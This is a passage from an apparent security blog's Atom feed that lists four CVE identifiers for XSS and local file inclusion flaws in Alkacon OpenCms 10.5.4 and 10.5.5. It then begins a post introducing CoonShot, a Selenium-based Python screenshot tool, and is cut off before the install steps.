+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CVE-2019-13234&lt;/strong&gt; -&amp;gt; Reflected XSS in the Alkacon OpenCms Apollo Template 10.5.4 and 10.5.5 search engine.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE-2019-13235&lt;/strong&gt; -&amp;gt; Reflected XSS in the Alkacon OpenCms Apollo Template 10.5.4 and 10.5.5 Login form.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE-2019-13236&lt;/strong&gt; -&amp;gt; Multiple XSS in Alkacon OpenCms 10.5.4 and 10.5.5 management interface.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE-2019-13237&lt;/strong&gt; -&amp;gt; Multiple LFI in Alkacon OpenCms 10.5.4 and 10.5.5 management interface.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://twitter.com/aetsu&quot;&gt;@Aetsu&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;</content><author><name>Aetsu</name></author><summary type="html">OpenCMS is a robust open source CMS written in Java widely used on the Internet. So given his exposure and the possibilities I started playing with this CMS to see how it works. For the tests I used the version available in hub.docker that allows a fast deployment if I “break” something.</summary></entry><entry><title type="html">CoonShot - A Python script to take screenshots of web pages</title><link href="/CoonShot" rel="alternate" type="text/html" title="CoonShot - A Python script to take screenshots of web pages" /><published>2019-06-17T00:00:00+02:00</published><updated>2019-06-17T00:00:00+02:00</updated><id>/CoonShot</id><content type="html" xml:base="/CoonShot">&lt;p&gt;There are many tools on the Internet to make screenshots of web pages, being &lt;em&gt;&lt;a href=&quot;https://github.com/FortyNorthSecurity/EyeWitness&quot;&gt;EyeWitness&lt;/a&gt;&lt;/em&gt; the best I know. However, sometimes I had difficulties installing it and I ended up developing my own tool based on 
 &lt;em&gt;&lt;a href=&quot;https://www.seleniumhq.org/&quot;&gt;Selenium&lt;/a&gt;&lt;/em&gt; to integrate it into other projects.&lt;/p&gt;
 
 &lt;p&gt;The script is called CoonShot and to install it in Kali 2019.2:&lt;/p&gt;
